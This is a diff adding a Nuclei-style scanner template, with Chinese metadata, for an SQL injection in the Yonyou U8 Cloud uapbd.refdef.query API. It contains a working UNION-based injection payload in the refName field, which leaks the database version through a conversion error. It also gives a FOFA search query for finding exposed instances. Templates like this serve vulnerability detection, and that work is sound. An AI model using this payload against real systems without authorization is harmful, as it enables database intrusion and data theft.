@@ -1,0 +1,38 @@
+id: yonyou-u8-cloud-uapbd-refdef-query-sqli
+
+info:
+  name: 用友U8 Cloud uapbd.refdef.query - SQL注入
+  author: qwtd
+  severity: high
+  description: 用友U8-Cloud系统接口uapbd.refdef.query存在SQL注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8BU8-Cloud%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3uapbd.refdef.query%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: title="U8C"
+  tags: 用友-U8,用友-NC-Cloud,Yonyou-UFIDA-NC,Yonyou-U8-Cloud
+
+http:
+  - raw:
+      - |
+        @timeout: 30s
+        POST /u8cloud/openapi/uapbd.refdef.query?appcode=huo&isEncrypt=N HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: application/json
+        Accept-Encoding: gzip
+        Connection: close
+
+        {"refName":"1%' UNION ALL SELECT 1,CONVERT(INT,@@VERSION),1-- "}
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "U8C返回信息"
+          - "转换成数据类型"
+        condition: and
+        
+      - type: status
+        status:
+          - 200
